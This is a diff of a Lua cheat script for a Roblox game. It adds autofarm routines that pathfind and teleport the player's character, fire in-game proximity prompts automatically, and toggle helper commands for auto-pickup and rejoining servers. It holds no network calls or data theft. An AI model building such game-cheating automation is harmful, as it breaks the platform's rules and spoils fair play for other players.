+							local elevatorsFolder = workspace:FindFirstChild("Elevators")
+
+							if elevatorsFolder then
+								local elevatorModel = elevatorsFolder:FindFirstChildWhichIsA("Model")
+
+								if elevatorModel then
+									local monsterBlocker = elevatorModel:FindFirstChild("MonsterBlocker")
+
+									if monsterBlocker and monsterBlocker:IsA("Part") then
+										local offsetCFrame = monsterBlocker.CFrame * CFrame.new(30, -10.5, 0)
+										destiny = offsetCFrame.Position
+										busy = true
+									end
+								end
+							end
+						end
+					end
+				end
+
+				if workspace.Info.Panic.Value == true or workspace.Info.FloorActive.Value == false then
+					destiny =  hitbox.Position + Vector3.new(0,-20,0)
+					busy = true
+				end
+
+				if destiny and busy and char.Decoding.Value == nil then
+					markMonsterZones()
+					local p = pathf:CreatePath(agent)
+					local compt = p:ComputeAsync(noxious["character"].PrimaryPart.Position,destiny)
+
+					local part = Instance.new("Part")
+					part.Position = destiny
+					part.Anchored = true
+					part.Size = Vector3.new(1,1,1)
+					Instance.new("Highlight",part)
+					part.Parent = workspace
+					part.Transparency = 1
+
+					game.Debris:AddItem(part,.3)
+
+					if next(p:GetWaypoints()) then
+						for i,v in pairs(p:GetWaypoints()) do
+							repeat task.wait()
+								local pos1 = noxious["character"].PrimaryPart.Position
+								local pos2 = v.Position
+								local dist = (pos1 - pos2)
+								local debugpart = Instance.new("Part")
+								debugpart.Position = v.Position
+								debugpart.Anchored = true
+								debugpart.Size = Vector3.new(.5,.5,.5)
+								debugpart.CanCollide = false
+								debugpart.Parent = workspace
+								debugpart.Transparency = 1
+								game.Debris:AddItem(debugpart,.5)
+								Instance.new("Highlight").Parent = debugpart
+								noxious["character"].Humanoid.WalkToPoint = v.Position + Vector3.new(0.1,0.1,0.1) * math.random()
+								if (dist.Magnitude < 5 or busy == false or char.Decoding.Value ~= nil) then
+									break
+								end
+
+							until false
+						end
+					else
+						destiny = destiny + Vector3.new(math.random(-2,2),0,math.random(-2,2))
+						local cf = char.PrimaryPart.CFrame
+						noxious["character"]:SetPrimaryPartCFrame(cf * CFrame.new(Vector3.new(math.random(-1,1),0,math.random(-1,1))))
+
+						local p = Instance.new("Part")
+						p.Position = destiny
+						p.Anchored = true
+						p.Size = Vector3.new(1,1,1)
+						-- Instance.new("Highlight",p)
+						p.Parent = workspace
+						p.Transparency = 1
+
+						game.Debris:AddItem(p,.3)
+					end
+
+					if elPrompt then
+						for i,v in pairs(elPrompt:GetDescendants()) do
+							if v:IsA("ProximityPrompt") then
+								v:InputHoldBegin()
+								v:InputHoldEnd()
+							end
+						end
+					end
+
+					busy = false
+				end
+			else
+
+				for i,v in pairs(workspace.Elevators:GetDescendants()) do
+					if v:IsA("ProximityPrompt") and not v:HasTag("TryItOut") then
+
+						if not dandystorecheck then
+							dandystorecheck = true
+							char.Humanoid.WalkToPoint = v.Parent.Position
+							v:AddTag("TryItOut")
+
+							repeat task.wait()
+								local dist = (v.Parent.Position - char.PrimaryPart.Position)
+
+								if dist.Magnitude < 4 then
+									break
+								end
+							until false
+
+							v:InputHoldBegin()
+							v:InputHoldEnd()
+
+							delay(.1,function()
+								dandystorecheck = false
+							end)
+						end
+					end
+				end
+			end  
+		end
+	end
+end
+
+function enabledekasautofarm()
+	if not inrun() then return end
+
+	local factive = game.Workspace:WaitForChild("Info"):WaitForChild("FloorActive")
+	if dekaafenabled then return end
+	dekaafenabled = true
+	task.spawn(function() execcmd("eadt") end)
+	task.spawn(function() execcmd("eac2") end)
+
+	if not dekaaffactiveconnection then
+		dekaaffactiveconnection = factive.Changed:Connect(function()
+			if factive.Value == true then
+				dekaaf()
+			end
+		end)
+	end
+
+	if factive.Value == true then
+		dekaaf()
+	end
+end
+
+function disabledekasautofarm()
+	if not inrun() then return end
+
+	if not dekaafenabled then return end
+	local factive = game.Workspace:WaitForChild("Info"):WaitForChild("FloorActive")
+	dekaafenabled = false
+	task.spawn(function() execcmd("dlms") end)
+
+	if dekaaffactiveconnection then
+		dekaaffactiveconnection:Disconnect()
+		dekaaffactiveconnection = nil
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+ondecodingcheckenabled = false
+ondecodingcheckconnection = nil
+
+function enabledecodingcheck()
+	if ondecodingcheckenabled then return end
+	ondecodingcheckenabled = true
+
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+
+	local function startChecking()
+		local char = player.Character or player.CharacterAdded:Wait()
+		local decoding = char:WaitForChild("Decoding")
+
+		-- Initial state check
+		if decoding.Value == nil then
+			execcmd("eait")
+		else
+			execcmd("dait")
+		end
+
+		-- Listen for changes
+		ondecodingcheckconnection = decoding:GetPropertyChangedSignal("Value"):Connect(function()
+			if not ondecodingcheckenabled then return end
+			if decoding.Value == nil then
+				execcmd("eait")
+			else
+				task.wait(0.5)
+				execcmd("dait")
+			end
+		end)
+	end
+
+	task.spawn(startChecking)
+end
+
+function disabledecodingcheck()
+	ondecodingcheckenabled = false
+	if ondecodingcheckconnection then
+		ondecodingcheckconnection:Disconnect()
+		ondecodingcheckconnection = nil
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxiousafflooractiveconnection = nil
+noxiousautofarmenabled = false
+
+function enablenoxiousautofarm()
+	if not inrun() then return end
+	if noxiousautofarmenabled then return end
+	noxiousautofarmenabled = true
+	task.spawn(function() execcmd("eac2") end)
+	task.spawn(function() execcmd("nccam") end)
+	task.spawn(function() execcmd("eatpte") end)
+	task.spawn(function() execcmd("eadt") end)
+	task.spawn(function() execcmd("ega") end)
+	task.spawn(function() execcmd("eaui") end)
+	if autobuyitems then task.spawn(function() execcmd("eba") end) end
+
+	local function onflooractive()
+		task.spawn(function() execcmd("ddt") end)
+		if encountertwisteds then execcmd("et") end
+		if collectcapsules then execcmd("puarc") end
+		if autopickupheals then execcmd("puah") end
+		if autopickupextractionitems then execcmd("puaei") end
+		task.wait(0.5)
+		task.spawn(function() execcmd("edt") end)
+		task.wait(0.5)
+		task.spawn(enabledecodingcheck)
+		task.spawn(function() execcmd("eatptg") end)
+		task.delay(1, function() execcmd("tptg") end)
+	end
+
+	local fa = workspace:WaitForChild("Info"):WaitForChild("FloorActive")
+	noxiousafflooractiveconnection = fa.Changed:Connect(onflooractive)
+end
+
+function disablenoxiousautofarm()
+	if not inrun() then return end
+	if not noxiousautofarmenabled then return end
+	noxiousautofarmenabled = false
+	task.spawn(function() execcmd("dac2") end)
+	task.spawn(function() execcmd("nccam") end)
+	task.spawn(function() execcmd("datpte") end)
+	task.spawn(function() execcmd("dadt") end)
+	task.spawn(function() execcmd("ddt") end)
+	task.spawn(function() execcmd("dait") end)
+	task.spawn(function() execcmd("dga") end)
+	task.spawn(function() execcmd("daui") end)
+	task.spawn(function() execcmd("datptg") end)
+	task.spawn(disabledecodingcheck)
+
+	if noxiousafflooractiveconnection then
+		noxiousafflooractiveconnection:Disconnect()
+		noxiousafflooractiveconnection = nil
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["local player"].CharacterAdded:Connect(function()
+	task.delay(10, function()
+		-- if persistence is enabled, and the user is in a run, and the server size is more than 1, then return back to the lobby
+		if inrun() and persistentautofarm then
+			if #Players:GetPlayers() > 1 then
+				execcmd("jl")
+				return
+			end
+		end
+
+		-- return if player is not in a run
+		if not inrun() then return end
+
+		-- if an autofarm is running and persistence is enabled, then enable the autofarm
+		if dekaautofarmrunning and persistentautofarm then enabledekasautofarm() end
+		if noxiousautofarmrunning and persistentautofarm then enablenoxiousautofarm() end
+
+		-- if an autofarm is running, and persistence is enabled, and the user dies, then go back to lobby (will teleport to a small server)
+		if (noxiousautofarmrunning or dekaautofarmrunning) and persistentautofarm then
+			task.spawn(function() execcmd("rejoindeath") end)
+		end
+
+		-- if persistence is enabled, and the user is in the lobby, teleport to an elevator
+		if inlobby() and persistentautofarm then execcmd("je1") end
+	end)
+end)
 
 -------------------------------------------------------------------------------------------------------------------------------
